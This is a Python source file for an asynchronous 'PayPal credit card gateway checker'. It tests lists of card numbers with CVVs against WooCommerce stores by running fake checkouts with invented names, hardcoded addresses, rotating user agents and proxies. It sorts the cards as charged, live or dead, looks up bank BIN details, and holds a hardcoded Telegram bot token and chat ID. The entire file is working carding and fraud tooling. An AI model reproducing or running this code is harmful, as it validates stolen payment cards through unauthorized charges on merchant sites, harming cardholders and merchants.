#!/usr/bin/env python3
"""
Async PayPal Credit Card Gateway Checker - Optimized for Production
Supports high concurrency with proper resource management and error handling.
"""
import asyncio
import aiohttp
import json
import re
import random
import time
import os
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
import ssl

# Import rate limiter and metrics
from .rate_limiter import global_rate_limiter, domain_rate_limiter
from .metrics import metrics_collector

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ppcp_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global session and cache
_session = None
_bin_cache = {}  # Simple dict cache for BIN info

# Configuration
class Config:
    """Configuration settings for production use"""
    TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA')
    CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003171561914')
    TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', '30'))
    MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', '100'))
    MAX_RETRIES = int(os.getenv('MAX_RETRIES', '3'))
    RETRY_DELAY = float(os.getenv('RETRY_DELAY', '1.0'))
    RATE_LIMIT_PER_SECOND = int(os.getenv('RATE_LIMIT_PER_SECOND', '10'))
    BIN_CHECK_TIMEOUT = int(os.getenv('BIN_CHECK_TIMEOUT', '10'))

# Address data
class AddressData:
    """Address data for different countries"""
    ADDRESSES = {
        'NZ': [
            {'street': '248 Princes Street', 'city': 'Grafton', 'zip': '1010', 'state': 'Auckland', 'phone': '(028) 8784-059'},
            {'street': '75 Queen Street', 'city': 'Auckland', 'zip': '1010', 'state': 'Auckland', 'phone': '(029) 1234-567'},
        ],
        'AU': [
            {'street': '123 George Street', 'city': 'Sydney', 'zip': '2000', 'state': 'NSW', 'phone': '+61 2 1234 5678'},
            {'street': '456 Collins Street', 'city': 'Melbourne', 'zip': '3000', 'state': 'VIC', 'phone': '+61 3 8765 4321'},
        ],
        'JP': [
            {'street': '1 Chome-1-2 Oshiage', 'city': 'Sumida City, Tokyo', 'zip': '131-0045', 'state': 'Tokyo', 'phone': '+81 3-1234-5678'},
        ],
        'PH': [
            {'street': '1234 Makati Ave', 'city': 'Makati', 'zip': '1200', 'state': 'Metro Manila', 'phone': '+63 2 1234 5678'},
        ],
        'MY': [
            {'street': 'No 56, Jalan Bukit Bintang', 'city': 'Kuala Lumpur', 'zip': '55100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-1234 5678'},
        ],
        'GB': [
            {'street': '10 Downing Street', 'city': 'London', 'zip': 'SW1A 2AA', 'state': '', 'phone': '+44 20 7925 0918'},
        ],
        'CA': [
            {'street': '123 Main Street', 'city': 'Toronto', 'zip': 'M5H 2N2', 'state': 'Ontario', 'phone': '(416) 555-0123'},
        ],
        'SG': [
            {'street': '10 Anson Road', 'city': 'Singapore', 'zip': '079903', 'state': 'Central Region', 'phone': '(+65) 6221-1234'},
        ],
        'TH': [
            {'street': '123 Sukhumvit Road', 'city': 'Bangkok', 'zip': '10110', 'state': 'Bangkok', 'phone': '(+66) 2-123-4567'},
        ],
        'HK': [
            {'street': '1 Queen\'s Road Central', 'city': 'Central', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2523-1234'},
        ],
        'ZA': [
            {'street': '10 Adderley Street', 'city': 'Cape Town', 'zip': '8000', 'state': 'Western Cape', 'phone': '(+27) 21-123-4567'},
        ],
        'NL': [
            {'street': '1 Dam Square', 'city': 'Amsterdam', 'zip': '1012 JS', 'state': 'North Holland', 'phone': '(+31) 20-555-1234'},
        ],
        'US': [
            {'street': '1600 Pennsylvania Avenue NW', 'city': 'Washington', 'zip': '20500', 'state': 'DC', 'phone': '+1 202-456-1111'},
            {'street': '1 Infinite Loop', 'city': 'Cupertino', 'zip': '95014', 'state': 'CA', 'phone': '+1 408-996-1010'},
        ],
    }

class NameGenerator:
    """Generate random names and emails"""
    FIRST_NAMES = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor']
    EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'icloud.com', 'hotmail.com']

    @staticmethod
    def generate() -> Tuple[str, str, str]:
        """Generate random first name, last name, and email"""
        fname = random.choice(NameGenerator.FIRST_NAMES)
        lname = random.choice(NameGenerator.LAST_NAMES)
        domain = random.choice(NameGenerator.EMAIL_DOMAINS)
        email = f"{fname.lower()}.{lname.lower()}@{domain}"
        return fname, lname, email

class UserAgentGenerator:
    """Generate random user agents"""
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]

    @staticmethod
    def get() -> str:
        return random.choice(UserAgentGenerator.USER_AGENTS)

class TelegramNotifier:
    """Send notifications to Telegram asynchronously"""

    @staticmethod
    async def send_message(message: str, token: str, chat_id: str):
        """Send message to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, timeout=10) as response:
                    if response.status != 200:
                        logger.warning(f"Telegram notification failed: {response.status}")
        except Exception as e:
            logger.error(f"Telegram error: {e}")

class BinChecker:
    """Check BIN information with caching"""

    @staticmethod
    async def check(bin_number: str, ua: str) -> Dict[str, str]:
        """Get BIN information with caching"""
        global _bin_cache
        
        # Check cache first
        if bin_number in _bin_cache:
            cache_entry = _bin_cache[bin_number]
            # Check if cache is still valid (1 hour TTL)
            if time.time() - cache_entry['timestamp'] < 3600:
                return cache_entry['data']
        
        try:
            url = f'https://bincheck.io/details/{bin_number}'
            headers = {
                'user-agent': ua,
                'referer': 'https://bincheck.io/',
                'accept-language': 'en-US,en;q=0.9'
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=Config.BIN_CHECK_TIMEOUT, ssl=ssl_context) as response:
                    html = await response.text()

            # Parse BIN info
            card_brand = BinChecker._extract_field(html, 'Card\\s*Brand')
            card_type = BinChecker._extract_field(html, 'Card\\s*Type')
            card_level = BinChecker._extract_field(html, 'Card\\s*Level')

            # Extract issuer
            issuer_match = re.search(r'<td[^>]*>\s*Issuer\s*Name\s*/\s*Bank\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            issuer_name = issuer_match.group(1).strip() if issuer_match else 'Unknown'
            issuer_name = re.sub(r'^Complete\s*', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*database.*$', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*-\s*[A-Z\s]+$', '', issuer_name, flags=re.I)

            # Extract country
            country_match = re.search(r'<td[^>]*>\s*ISO\s*Country\s*Name\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            iso_country = country_match.group(1).strip() if country_match else 'Unknown'
            iso_country = re.sub(r'^Complete\s*', '', iso_country, flags=re.I)
            iso_country = re.sub(r'\s*database.*$', '', iso_country, flags=re.I)

            result = {
                'brand': card_brand,
                'type': card_type,
                'level': card_level,
                'issuer': issuer_name,
                'country': iso_country
            }
            
            # Cache the result
            _bin_cache[bin_number] = {
                'data': result,
                'timestamp': time.time()
            }
            
            return result
        except Exception as e:
            logger.error(f"BIN check error for {bin_number}: {e}")
            return {
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'issuer': 'Unknown',
                'country': 'Unknown'
            }

    @staticmethod
    def _extract_field(html: str, field_name: str) -> str:
        """Extract field from HTML"""
        pattern = f'<td[^>]*>\\s*{field_name}\\s*</td>\\s*<td[^>]*>\\s*(.*?)\\s*</td>'
        match = re.search(pattern, html, re.I)
        return match.group(1).strip() if match else 'Unknown'

class AsyncCardChecker:
    """Async card checker with proper resource management"""

    def __init__(self, cc_data: str, site_url: str, proxy: Optional[str] = None, session: aiohttp.ClientSession = None):
        self.cc_data = cc_data
        self.site_url = site_url
        self.proxy = proxy
        self.session = session
        self.ua = UserAgentGenerator.get()
        self.start_time = time.time()
        
        # Parse card data
        parts = cc_data.split('|')
        self.cc = parts[0].strip()
        self.mes = parts[1].strip().zfill(2)
        self.ano = parts[2].strip()
        self.cvv = parts[3].strip()

        # Fix year format
        if len(self.ano) == 2:
            self.ano = f"20{self.ano}"

        self.cc6 = self.cc[:6]

        # Setup proxy
        self.proxies = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) >= 2:
                if len(proxy_parts) == 4:
                    self.proxies = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                else:
                    self.proxies = f"http://{proxy_parts[0]}:{proxy_parts[1]}"

        # Parse site
        parsed = urlparse(site_url)
        self.hostname = parsed.netloc
        self.country = self._detect_country()

        # Get address
        address = self._get_address()
        self.street = address['street']
        self.city = address['city']
        self.zip = address['zip']
        self.state = address['state']
        self.phone = address['phone']

        # Generate name
        self.fname, self.lname, self.email = NameGenerator.generate()

    def _detect_country(self) -> str:
        """Detect country from domain"""
        hostname_lower = self.hostname.lower()
        if hostname_lower.endswith('.co.uk'):
            return 'GB'
        elif hostname_lower.endswith('.au'):
            return 'AU'
        elif hostname_lower.endswith('.ca'):
            return 'CA'
        elif hostname_lower.endswith('.co.nz'):
            return 'NZ'
        elif hostname_lower.endswith('.jp'):
            return 'JP'
        elif hostname_lower.endswith('.ph'):
            return 'PH'
        elif hostname_lower.endswith('.my'):
            return 'MY'
        elif hostname_lower.endswith('.sg'):
            return 'SG'
        elif hostname_lower.endswith('.th'):
            return 'TH'
        elif hostname_lower.endswith('.nl'):
            return 'NL'
        elif hostname_lower.endswith('.hk'):
            return 'HK'
        elif hostname_lower.endswith('.co.za'):
            return 'ZA'
        else:
            return 'US'

    def _get_address(self) -> Dict[str, str]:
        """Get address for country"""
        addresses = AddressData.ADDRESSES.get(self.country, AddressData.ADDRESSES['US'])
        index = int(time.time() / 10) % len(addresses)
        return addresses[index]

    def _get_headers(self, extra: Optional[Dict] = None) -> Dict[str, str]:
        """Get request headers"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': self.ua,
            'referer': f'https://{self.hostname}/',
        }
        if extra:
            headers.update(extra)
        return headers

    async def check(self) -> Dict[str, Any]:
        """Check the card asynchronously"""
        try:
            # Step 1: Get product page
            product_page = await self._get_product_page()
            if not product_page:
                return self._error_result("Failed to load product page")

            # Step 2: Parse product ID
            product_id, variation_id = self._parse_product_id(product_page)
            if not product_id:
                return self._error_result("Cannot find product ID")

            # Step 3: Add to cart
            atc_url = self._build_atc_url(product_id, variation_id)
            await self._add_to_cart(atc_url)

            # Step 4: Get checkout page
            checkout_html = await self._get_checkout()
            if not checkout_html:
                return self._error_result("Failed to load checkout")

            # Step 5: Parse nonces and price
            nonces = self._parse_nonces(checkout_html)
            price = self._parse_price(checkout_html)

            # Step 6: Get client ID
            access_token = await self._get_client_id(nonces.get('client_nonce'))
            if not access_token:
                return self._error_result("Failed to get access token")

            # Step 7: Create order
            order_id, custom_id = await self._create_order(nonces.get('create_order_nonce'))
            if not order_id:
                return self._error_result("Failed to create order")

            # Step 8: Confirm payment
            confirm_result = await self._confirm_payment(order_id, access_token)

            # Step 9: Approve order
            approve_result = await self._approve_order(order_id, nonces.get('approve_order_nonce'))

            # Step 10: Process checkout
            payment_result = await self._process_checkout(custom_id, nonces.get('checkout_nonce'))

            # Step 11: Parse result
            return await self._parse_result(payment_result, price)

        except Exception as e:
            logger.error(f"Exception checking card {self.cc}: {e}")
            return self._error_result(f"Exception: {str(e)}")

    async def _get_with_retry(self, url: str, headers: Dict, **kwargs) -> Optional[str]:
        """Get URL with retry logic, rate limiting, and metrics"""
        # Apply rate limiting
        parsed_url = urlparse(url)
        domain = parsed_url.netloc

        start_time = time.time()
        for attempt in range(Config.MAX_RETRIES):
            try:
                # Acquire rate limiting tokens
                await global_rate_limiter.acquire()
                await domain_rate_limiter.acquire(domain)

                async with self.session.get(
                    url, headers=headers, proxy=self.proxies, timeout=Config.TIMEOUT, **kwargs
                ) as response:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, True, response_time, response.status)
                    return await response.text()
            except Exception as e:
                if attempt == Config.MAX_RETRIES - 1:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, False, response_time)
                    logger.error(f"Failed to get {url} after {Config.MAX_RETRIES} attempts: {e}")
                    return None
                await asyncio.sleep(Config.RETRY_DELAY * (2 ** attempt))  # Exponential backoff
        return None

    async def _post_with_retry(self, url: str, headers: Dict, data: Any = None, **kwargs) -> Optional[str]:
        """Post URL with retry logic, rate limiting, and metrics"""
        # Apply rate limiting
        parsed_url = urlparse(url)
        domain = parsed_url.netloc

        start_time = time.time()
        for attempt in range(Config.MAX_RETRIES):
            try:
                # Acquire rate limiting tokens
                await global_rate_limiter.acquire()
                await domain_rate_limiter.acquire(domain)

                async with self.session.post(
                    url, headers=headers, data=data, proxy=self.proxies, timeout=Config.TIMEOUT, **kwargs
                ) as response:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, True, response_time, response.status)
                    return await response.text()
            except Exception as e:
                if attempt == Config.MAX_RETRIES - 1:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, False, response_time)
                    logger.error(f"Failed to post {url} after {Config.MAX_RETRIES} attempts: {e}")
                    return None
                await asyncio.sleep(Config.RETRY_DELAY * (2 ** attempt))  # Exponential backoff
        return None

    async def _get_product_page(self) -> Optional[str]:
        """Get product page HTML"""
        return await self._get_with_retry(self.site_url, self._get_headers())

    def _parse_product_id(self, html: str) -> Tuple[Optional[str], Optional[str]]:
        """Parse product ID and variation ID from HTML"""
        # Try variations form
        form_match = re.search(r'<form[^>]+class="variations_form cart"[^>]+data-product_id="([^"]+)"', html)
        if form_match:
            product_id = form_match.group(1)
            # Try to get variation data
            var_match = re.search(r'data-product_variations="([^"]+)"', html)
            if var_match and var_match.group(1) != 'false':
                try:
                    var_data = json.loads(var_match.group(1).replace('&quot;', '"'))
                    if var_data and len(var_data) > 0:
                        return product_id, var_data[0].get('variation_id')
                except:
                    pass
            return product_id, None

        # Try input field
        input_match = re.search(r'<input[^>]+name="(?:product_id|add-to-cart)"[^>]+value="([^"]+)"', html)
        if input_match:
            return input_match.group(1), None

        # Try button
        button_match = re.search(r'<button[^>]+name="add-to-cart"[^>]+value="([^"]+)"', html)
        if button_match:
            return button_match.group(1), None

        return None, None

    def _build_atc_url(self, product_id: str, variation_id: Optional[str]) -> str:
        """Build add to cart URL"""
        params = {
            'quantity': '1',
            'add-to-cart': product_id
        }
        if variation_id:
            params['variation_id'] = variation_id
            params['product_id'] = product_id

        return f"{self.site_url}?{urlencode(params)}"

    async def _add_to_cart(self, url: str) -> Optional[str]:
        """Add product to cart"""
        return await self._get_with_retry(url, self._get_headers())

    async def _get_checkout(self) -> Optional[str]:
        """Get checkout page"""
        checkout_url = f"https://{self.hostname}/checkout"
        return await self._get_with_retry(checkout_url, self._get_headers())

    def _parse_nonces(self, html: str) -> Dict[str, str]:
        """Parse nonces from checkout page"""
        nonces = {}

        # Create order nonce
        match = re.search(r'"create_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['create_order_nonce'] = match.group(1)

        # Approve order nonce
        match = re.search(r'"approve_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['approve_order_nonce'] = match.group(1)

        # Client nonce
        match = re.search(r'"data_client_id":\s*\{\s*"set_attribute":.*?\s*"endpoint":.*?\s*"nonce":\s*"([^"]+)"', html)
        if match:
            nonces['client_nonce'] = match.group(1)

        # Checkout nonce
        match = re.search(r'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="([^"]+)"', html)
        if match:
            nonces['checkout_nonce'] = match.group(1)

        return nonces

    def _parse_price(self, html: str) -> str:
        """Parse price from checkout page"""
        pattern = r'<tr class="order-total">.*?<th>Total</th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)</span>\s*([\d.]+)'
        match = re.search(pattern, html, re.DOTALL)
        if match:
            symbol = match.group(1).replace('&pound;', '£')
            amount = match.group(2)
            return f"{symbol}{amount}"
        return "N/A"

    async def _get_client_id(self, nonce: Optional[str]) -> Optional[str]:
        """Get PayPal client ID and access token"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-data-client-id"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
            })

            data = {
                'set_attribute': 'true',
                'nonce': nonce or '',
                'user': '0',
                'has_subscriptions': 'false',
                'paypal_subscriptions_enabled': 'false'
            }

            response_text = await self._post_with_retry(url, headers, json.dumps(data))
            if not response_text:
                return None

            result = json.loads(response_text)
            token = result.get('token')
            if token:
                import base64
                decoded = base64.b64decode(token).decode('utf-8')
                token_data = json.loads(decoded)
                return token_data.get('paypal', {}).get('accessToken')
        except Exception as e:
            logger.error(f"Error getting client ID: {e}")
        return None

    async def _create_order(self, nonce: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
        """Create PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-create-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })

            form_data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
            }

            payload = {
                'nonce': nonce or '',
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'payment_method': 'ppcp-gateway',
                'form_encoded': urlencode(form_data),
                'createaccount': False,
                'save_payment_method': False
            }

            response_text = await self._post_with_retry(url, headers, json.dumps(payload))
            if not response_text:
                return None, None

            result = json.loads(response_text)
            if result.get('success'):
                return result['data']['id'], result['data'].get('custom_id')
        except Exception as e:
            logger.error(f"Error creating order: {e}")
        return None, None

    async def _confirm_payment(self, order_id: str, access_token: str) -> Optional[str]:
        """Confirm payment with PayPal"""
        try:
            url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'authorization': f'Bearer {access_token}',
                'user-agent': self.ua,
            }

            payload = {
                'payment_source': {
                    'card': {
                        'number': self.cc,
                        'security_code': self.cvv,
                        'expiry': f'{self.ano}-{self.mes}'
                    }
                }
            }

            return await self._post_with_retry(url, headers, json.dumps(payload))
        except Exception as e:
            logger.error(f"Error confirming payment: {e}")
        return None

    async def _approve_order(self, order_id: str, nonce: Optional[str]) -> Optional[str]:
        """Approve PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-approve-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })

            payload = {
                'nonce': nonce or '',
                'order_id': order_id
            }

            return await self._post_with_retry(url, headers, json.dumps(payload))
        except Exception as e:
            logger.error(f"Error approving order: {e}")
        return None

    async def _process_checkout(self, custom_id: Optional[str], nonce: Optional[str]) -> Optional[str]:
        """Process final checkout"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=checkout"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'XMLHttpRequest',
            })

            data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
                'ppcp-resume-order': custom_id or ''
            }

            return await self._post_with_retry(url, headers, urlencode(data))
        except Exception as e:
            logger.error(f"Error processing checkout: {e}")
        return None

    async def _parse_result(self, payment_result: Optional[str], price: str) -> Dict[str, Any]:
        """Parse payment result"""
        if not payment_result:
            return self._error_result("No payment response")

        # Get BIN info
        bin_info = await BinChecker.check(self.cc6, self.ua)

        result = {
            'cc': self.cc_data,
            'site': self.hostname,
            'price': price,
            'bin_info': bin_info,
            'status': 'DEAD',
            'message': 'Unknown error'
        }

        # Check for success
        if '"result":"success"' in payment_result and 'order-received' in payment_result:
            try:
                data = json.loads(payment_result)
                receipt_url = data.get('data', {}).get('redirect')
                if receipt_url:
                    result['status'] = 'CVV'
                    result['message'] = 'CVV CHARGED'
                    result['receipt'] = receipt_url

                    # Calculate elapsed time
                    elapsed_time = time.time() - self.start_time

                    # Format the response
                    response_text = f"""CVV ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CVV CHARGED

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text
                    result['formatted_status'] = 'CVV'

                    return result
            except Exception as e:
                logger.error(f"Error parsing success response: {e}")

        # Check for specific errors
        error_patterns = {
            'PAYMENT_DENIED': ('CCN', 'PAYMENT_DENIED - LIVE CC'),
            'ORDER_NOT_APPROVED': ('DEAD', 'ORDER_NOT_APPROVED'),
            'TRANSACTION_REFUSED': ('DEAD', 'TRANSACTION_REFUSED'),
            'DUPLICATE_INVOICE_ID': ('DEAD', 'DUPLICATE_INVOICE_ID'),
            'session has expired': ('DEAD', 'Session expired'),
            'Payment provider declined': ('DEAD', 'Payment provider declined')
        }

        for pattern, (status, message) in error_patterns.items():
            if pattern in payment_result:
                result['status'] = status
                result['message'] = message
                
                # Calculate elapsed time
                elapsed_time = time.time() - self.start_time

                if status == 'CCN':
                    response_text = f"""CCN ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text
                    result['formatted_status'] = 'CCN'
                else:
                    response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text

                return result

        # Try to extract generic message
        try:
            data = json.loads(payment_result)
            if 'messages' in data:
                msg = re.sub(r'<[^>]+>', '', data['messages'])
                msg = re.sub(r'\s+', ' ', msg).strip()
                result['message'] = msg[:100]
        except:
            pass

        # Calculate elapsed time
        elapsed_time = time.time() - self.start_time

        response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result['message']}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

        result['response_text'] = response_text
        return result

    def _error_result(self, message: str) -> Dict[str, Any]:
        """Create error result"""
        return {
            'cc': self.cc_data,
            'site': self.hostname,
            'status': 'ERROR',
            'message': message,
            'bin_info': {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown', 'issuer': 'Unknown', 'country': 'Unknown'}
        }

async def create_session() -> aiohttp.ClientSession:
    """Create a shared session with connection pooling"""
    connector = aiohttp.TCPConnector(
        limit=Config.MAX_CONCURRENT_REQUESTS,
        limit_per_host=10,
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False  # Disable SSL verification for flexibility
    )
    return aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=Config.TIMEOUT))

async def check_single_card(card_details: str, site_urls: List[str], proxy: Optional[str] = None) -> str:
    """Check a single card asynchronously"""
    global _session
    if _session is None:
        _session = await create_session()
    
    site_url = random.choice(site_urls) if site_urls else "https://example.com"
    
    checker = AsyncCardChecker(card_details, site_url, proxy, _session)
    result = await checker.check()
    
    return result.get('response_text', f"ERROR: {result.get('message', 'Unknown error')}")

async def check_multiple_cards(card_list: List[str], site_list: List[str], max_concurrent: int = 10) -> List[str]:
    """Check multiple cards with controlled concurrency"""
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def check_with_semaphore(card):
        async with semaphore:
            return await check_single_card(card, site_list)
    
    tasks = [check_with_semaphore(card) for card in card_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Handle exceptions
    formatted_results = []
    for i, result in enumerate(results):
        if isinstance(result, BaseException):
            formatted_results.append(f"ERROR: Exception checking card {card_list[i]}: {str(result)}")
        else:
            formatted_results.append(result)
    
    return formatted_results

async def cleanup():
    """Cleanup resources"""
    global _session
    if _session:
        await _session.close()
        _session = None

# Main entry point for async usage
async def main_async():
    """Async main function for production use"""
    try:
        # Load sites and cards
        sites = []
        cards = []
        
        # Try to load sites.txt from ppcp directory first
        sites_file = 'ppcp/sites.txt'
        if not os.path.exists(sites_file):
            sites_file = 'sites.txt'
            
        if os.path.exists(sites_file):
            with open(sites_file, 'r') as f:
                sites = [line.strip() for line in f if line.strip()]
            # Randomize sites list for better distribution
            random.shuffle(sites)
        
        # Try to load cc.txt from current directory
        if os.path.exists('cc.txt'):
            with open('cc.txt', 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
        
        if not sites:
            logger.error("No sites found in sites.txt")
            return
        
        if not cards:
            logger.error("No cards found in cc.txt")
            return
        
        logger.info(f"Loaded {len(sites)} sites and {len(cards)} cards")
        logger.info(f"Starting check with max {Config.MAX_CONCURRENT_REQUESTS} concurrent requests")
        
        # Check cards
        results = await check_multiple_cards(cards, sites, Config.MAX_CONCURRENT_REQUESTS)
        
        # Print results
        for result in results:
            print(result)
            
    except Exception as e:
        logger.error(f"Error in main async: {e}")
    finally:
        await cleanup()

# Sync wrapper for backward compatibility
def check_ppcp_card(card_details: str, site_urls: List[str]) -> str:
    """Sync wrapper for single card checking"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            # If already in async context, try to use nest_asyncio
            try:
                import nest_asyncio
                nest_asyncio.apply()
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            except ImportError:
                # If nest_asyncio is not available, create a new loop manually
